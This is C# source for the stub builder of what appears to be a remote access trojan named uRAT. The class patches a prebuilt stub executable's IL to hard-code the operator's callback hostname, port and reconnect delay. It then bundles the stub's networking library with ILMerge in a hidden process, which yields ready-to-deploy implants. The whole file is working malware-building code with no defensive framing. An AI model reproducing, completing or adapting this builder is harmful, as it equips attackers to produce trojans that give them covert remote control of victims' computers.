using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using uRAT.Server.Builder.Exceptions;
using uRAT.Server.Tools;
using Res = uRAT.Server.Tools.ResourcesHelper;

namespace uRAT.Server.Builder
{
    internal class StubBuilder
    {
        private BuildSettings _settings;

        public StubBuilder(BuildSettings settings)
        {
            _settings = settings;
        }

        public void Build(string filename)
        {
            if (!File.Exists(ResourcesHelper.GetResourceFile(ResourceFamily.Builder, "stub.exe")))
                throw new ComponentMissingException("Failed to locate stub file");
            var asm = AssemblyDef.Load(Res.GetResourceFile(ResourceFamily.Builder, "stub.exe"));
            InjectSettings(asm);
            if (_settings.MergeDependencies)
            {
                asm.Write(Res.GetResourceFile(ResourceFamily.Builder, "temp.exe"));
                DeployIlMerge();
                PerformDependencyMerge(filename);
            }
            else
            {
                asm.Write(filename);
                File.Copy(Res.GetResourceFile(ResourceFamily.Builder, "uNet2.dll"),
                    Path.Combine(Path.GetDirectoryName(filename), "uNet2.dll"));
            }
        }

        private void InjectSettings(AssemblyDef asm)
        {
            var ep = asm.ManifestModule.EntryPoint;
            var settingsMethod = ep.DeclaringType.FindMethod(new UTF8String("InitializeSettings"));
            if (settingsMethod == null)
                throw new ComponentMissingException("Failed to locate InitializeSettings method in stub");
            settingsMethod.Body.Instructions[0].Operand = _settings.Hostname;
            settingsMethod.Body.Instructions[2].OpCode = OpCodes.Ldc_I4;
            settingsMethod.Body.Instructions[2].Operand = _settings.Port;
            settingsMethod.Body.Instructions[4].OpCode = OpCodes.Ldc_I4;
            settingsMethod.Body.Instructions[4].Operand = _settings.ReconnectDelay*1000;
        }

        private void DeployIlMerge()
        {
            if (!File.Exists(Res.GetResourceFile(ResourceFamily.Builder, "ILMerge.exe")))
                File.WriteAllBytes(Res.GetResourceFile(ResourceFamily.Builder, "ILMerge.exe"), Properties.Resources.ILMerge);
        }

        private void PerformDependencyMerge(string filename)
        {
            var proc = new Process();
            proc.StartInfo.FileName = Res.GetResourceFile(ResourceFamily.Builder, "ILMerge.exe");
            proc.StartInfo.Arguments = string.Format(@"/log /out:""{0}"" ""{1}"" ""{2}""", filename,
                Res.GetResourceFile(ResourceFamily.Builder, "temp.exe"),
                Res.GetResourceFile(ResourceFamily.Builder, "uNet2.dll"));
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            proc.WaitForExit();
        }
    }
}